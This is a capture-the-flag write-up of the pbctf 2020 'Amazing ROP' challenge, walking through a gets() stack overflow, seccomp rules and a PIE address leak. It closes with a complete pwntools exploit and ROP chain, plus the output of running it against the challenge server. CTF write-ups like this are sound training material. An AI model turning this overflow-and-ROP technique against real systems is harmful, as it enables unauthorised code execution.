# pbctf 2020

## Amazing ROP

> 38
>
> Should be a baby ROP challenge. Just need to follow direction and get first flag.
>
> `nc maze.chal.perfect.blue 1`
>
> By: theKidOfArcrania
> 
> [bof](bof) [bof.c](bof.c)

Tags: _pwn_ _x86_ _bof_ _rop_


## Summary

Interesting baby ROP that if you just _follow direction_ with a little bit of work you'll get the flag.

> port 1, lol, amazing.
 

## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations except canary in place, not unexpected since the name of the challenge is _Amazing ROP_ and the name of the binary is `bof`.  So I guess we BOF and ROP.


### Read the source

```c
void vuln() {
  int secret = 0xdeadbeef;
  char padding[16];
  char buff[32];

  show_color = prompt("Do you want color in the visualization? (Y/n) ", 1);

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff);

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");

  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff);

  // Check if secret has changed.
  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    // print_flag(); // Print out the flag. You deserve it. (not anymore)
    printf("Returning to address: %p\n", (&secret)[4]);
    return;
  } else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  } else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
  }

  exit(0);
}
```

`gets` _is_ the _vulnerable call_, and if there were any doubts, it is pointed out in the source.

Clearly we have to change `secret` to `0x67616c66` (ASCII for `flag`, sadly, I've seen that number too many times, its burned into my brain), if so, then `print_flag()` is called, except that it isn't because it's commented out.  However...

```c
// This is what you need to do to get the first flag
// void print_flag() {
//   asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
// }
```

We have the source, we just need a few ROP gadgets to print the flag.


### Give it a run

```
# ./bof
Do you want color in the visualization? (Y/n) [1]    24763 segmentation fault  ./bof
```

Hmmm... not good, let's take a look with Ghidra.


### Decompile with Ghidra

`main` calls a function `safeguard` before `vuln`, the interesting bits below:

```c
  __pid = fork();
  if (__pid == 0) {
    ptrace(PTRACE_TRACEME,0,0,0,0);
    install_seccomp();
    return;
  }
  if (__pid < 0) {
    perror("fork()");
    exit(1);
  }
  __stream = fopen("passwds","r");
```

So, two things to take away:

1. We get forked and seccomp'd.
2. We need to create a bogus file `passwds`.

If we `touch passwds`, the segfault goes away, now we can get to work, but what about seccomp?

```bash
# seccomp-tools dump ./bof
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0x40000003  if (A != ARCH_I386) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x06 0x00 0x00000003  if (A == read) goto 0010
 0004: 0x15 0x05 0x00 0x00000004  if (A == write) goto 0010
 0005: 0x15 0x04 0x00 0x000000c5  if (A == fstat64) goto 0010
 0006: 0x15 0x03 0x00 0x0000002d  if (A == brk) goto 0010
 0007: 0x15 0x02 0x00 0x00000001  if (A == exit) goto 0010
 0008: 0x15 0x01 0x00 0x000000fc  if (A == exit_group) goto 0010
 0009: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

That's pretty grim.  Best if we just stick to the advice in the source (which, BTW, will have the primary process print the flag--this is a pretty cool challenge).

Since we're already in Ghidra, might as well get the `vuln` stack diagram:

```
undefined         AL:1               <RETURN>
undefined4        Stack[0x0]:4       local_res0
undefined4        Stack[-0x8]:4      local_8
int               Stack[-0x10]:4     secret
char[16]          Stack[-0x20]:16    padding
char[32]          Stack[-0x40]:32    buff
```

To overwrite `secret` with `flag`, we need to send `0x40 - 0x10` (48) bytes followed by `flag`.


### Give it a run (again)

```bash
# ./bof
Do you want color in the visualization? (Y/n) n

0xff8bed2c | 00 00 00 00 00 00 00 00 |
0xff8bed34 | 00 00 00 00 00 00 00 00 |
0xff8bed3c | 00 00 00 00 00 00 00 00 |
0xff8bed44 | 00 00 00 00 00 00 00 00 |
0xff8bed4c | ff ff ff ff ff ff ff ff |
0xff8bed54 | ff ff ff ff ff ff ff ff |
0xff8bed5c | ef be ad de 5c 9f 5f 56 |
0xff8bed64 | 5c 9f 5f 56 78 ed 8b ff |
0xff8bed6c | 99 65 5f 56 90 ed 8b ff |
0xff8bed74 | 00 00 00 00 00 00 00 00 |
Input some text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag

0xff8bed2c | 41 41 41 41 41 41 41 41 |
0xff8bed34 | 41 41 41 41 41 41 41 41 |
0xff8bed3c | 41 41 41 41 41 41 41 41 |
0xff8bed44 | 41 41 41 41 41 41 41 41 |
0xff8bed4c | 41 41 41 41 41 41 41 41 |
0xff8bed54 | 41 41 41 41 41 41 41 41 |
0xff8bed5c | 66 6c 61 67 00 9f 5f 56 |
0xff8bed64 | 5c 9f 5f 56 78 ed 8b ff |
0xff8bed6c | 99 65 5f 56 90 ed 8b ff |
0xff8bed74 | 00 00 00 00 00 00 00 00 |
You did it! Congratuations!
Returning to address: 0x565f6599
```

The challenge author kindly provided a stack dump, we do not even have to use GDB with this.

We can scrape the return address (back to `main`) from the first stack diagram (before `Input some text:`) to compute the base process address--required for our ROP chain.  Just look 10 lines down to:

```
0xff8bed6c | 99 65 5f 56 90 ed 8b ff |
```


### Let's go shopping

Lastly we need to find the ROP gadgets that satisfies:

```c
// This is what you need to do to get the first flag
// void print_flag() {
//   asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
// }
```

`ropper --file bof` found `0x00001396: pop esi; pop edi; pop ebp; ret;` that will satisfy `edi` and `esi`, however, `ropper` did not find `ret3` or anything useful for `eax`.  After taking a quick look with `objdump -M intel -d bof` I found:

```assembly
    13ad:       58                      pop    eax
    13ae:       cc                      int3
    13af:       c3                      ret
```    

We have everything we need.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./bof')

if args.REMOTE:
    p = remote('maze.chal.perfect.blue', 1)
else:
    p = process(binary.path)

'''
// This is what you need to do to get the first flag
// void print_flag() {
//   asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
// }
'''

# 0x00001396: pop esi; pop edi; pop ebp; ret;
binary.symbols['pop_esi_edi_edp'] = 0x00001396

# ropper did not find this
'''
    13ad:       58                      pop    eax
    13ae:       cc                      int3
    13af:       c3                      ret
'''
binary.symbols['pop_eax_int3'] = 0x13ad
```

The lines `binary.symbols['pop_esi_edi_edp'] = 0x00001396` and `binary.symbols['pop_eax_int3'] = 0x13ad` add symbols to our symbol table so we can reference them by name.  This also makes it easier to do the address math, since after we leak the base process address and set `binary.address`, then there's nothing else to do but use by symbol.

```python
p.sendlineafter('Do you want color in the visualization? (Y/n) ', 'n')

for i in range(10):
    _ = p.recvline().strip().decode().split(' ')

return_addr = int(''.join(_[2:6][::-1]),16)
log.info('return_addr: ' + hex(return_addr))
binary.address = return_addr - ((return_addr & 0xFFF) - (binary.sym.main & 0xFFF)) - binary.sym.main
log.info('binary.address: ' + hex(binary.address))
```

Skip to the 10th line and get the return address from the stack dump and use that to compute the base process address.

```python
payload  = b''
payload += (0x40 - 0x10) * b'A'
payload += b'flag'
payload += (0x40 - len(payload)) * b'A'
payload += p32(binary.sym.pop_esi_edi_edp)
payload += p32(0x1337)
payload += p32(0x31337)
payload += p32(0xdeadba5e)
payload += p32(binary.sym.pop_eax_int3)
payload += p32(1)

p.sendlineafter('Input some text: ', payload)
p.stream()
```

The first half of the payload sends `0x40 - 0x10` (48) bytes then `flag` (see analysis section), then pads out to `0x40` bytes (see stack diagram in analysis section, `buff` is `0x40` bytes from return address on stack).

Next, just follow the _instructions:_ `mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3`

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/pbctf2020/amazing_rop/bof'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to maze.chal.perfect.blue on port 1: Done
[*] return_addr: 0x5664b599
[*] binary.address: 0x5664a000

0xfff687fc | 41 41 41 41 41 41 41 41 |
0xfff68804 | 41 41 41 41 41 41 41 41 |
0xfff6880c | 41 41 41 41 41 41 41 41 |
0xfff68814 | 41 41 41 41 41 41 41 41 |
0xfff6881c | 41 41 41 41 41 41 41 41 |
0xfff68824 | 41 41 41 41 41 41 41 41 |
0xfff6882c | 66 6c 61 67 41 41 41 41 |
0xfff68834 | 41 41 41 41 41 41 41 41 |
0xfff6883c | 96 b3 64 56 37 13 00 00 |
0xfff68844 | 37 13 03 00 10 0f 5e ba |
You did it! Congratuations!
Returning to address: 0x5664b396
pbctf{hmm_s0mething_l00ks_off_w1th_th1s_s3tup}
Segmentation fault
[31337.1337] bof.bin[1753]: segfault at f7f50000 ip 00000000f7f50000 sp 00000000fff68858
```

Flag: `pbctf{hmm_s0mething_l00ks_off_w1th_th1s_s3tup}`
